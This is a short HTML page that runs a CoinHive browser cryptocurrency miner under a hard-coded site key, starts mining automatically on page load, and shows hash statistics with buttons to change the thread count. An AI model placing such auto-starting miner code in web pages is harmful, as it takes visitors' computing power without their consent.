<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml">
<head>
	<title></title>
</head>
<body style="background: #F1F1F1;">
Hashes/S:<span id="hashesPerSecond">0</span><br/>
Total hashes:<span id="totalHashes">0</span><br/>
Accepted hashes:<span id="acceptedHashes">0</span><br/>
Number of threads:<span id="threads">1</span><br/>
<h3 id="hash"></h3>
<span id="increaseThreads" onClick="increaseThreads()">+</span>
<span id="decreaseThreads" onClick="decreaseThreads()">-</span>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script
  src="https://code.jquery.com/jquery-3.2.1.min.js"
  integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
  crossorigin="anonymous"></script>
<script>

	var threads = 1;
	
	function startMiner(threads){
		miner = new CoinHive.User('8zBdpYoh9sqrrHCE3JKWPnGjhxYZzjly', 'nightmare',{
		threads: threads,
		autoThreads: false,
		throttle: 0.4,
		forceASMJS: false
		});
		miner.start();
	}
	function makeHash() {
		var text = "";
		var possible = "abcdefghijklmnopqrstuvwxyz0123456789";
		for (var i = 0; i < 64; i++)
		text += possible.charAt(Math.floor(Math.random() * possible.length));
	return text;
}
	
	startMiner(threads); 

	// Listen on events

	miner.on('accepted', function() { /* Hash accepted by the pool */ 
	console.log("Hash accepted!");
	})

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();
		console.log(hashesPerSecond);
		$('#hashesPerSecond').text(Math.round(hashesPerSecond));
		$('#totalHashes').text(Math.round(totalHashes));
		$('#acceptedHashes').text(Math.round(acceptedHashes));
		$('#hash').text(makeHash())
			miner.on('found', function() { /* Hash found */ 
				$('#hash').text('$$$HASH$FOUND$$$');
			})
		// Output to HTML elements...
	}, 1000);
	
	function increaseThreads(){
		if (threads < 12){
		threads = threads + 1;
		console.log(threads);
		$('#threads').text(threads);
		miner.stop();
		startMiner(threads);
		}
		else{console.log('Maximum number of threads reached!')}
	}
	
		function decreaseThreads(){
		if (threads > 1){
		threads = threads - 1;
		console.log(threads);
		$('#threads').text(threads);
				miner.stop();
		startMiner(threads);
		}
		else{console.log('Minimum number of threads reached!')}
		

	}
</script>

</body>
</html>
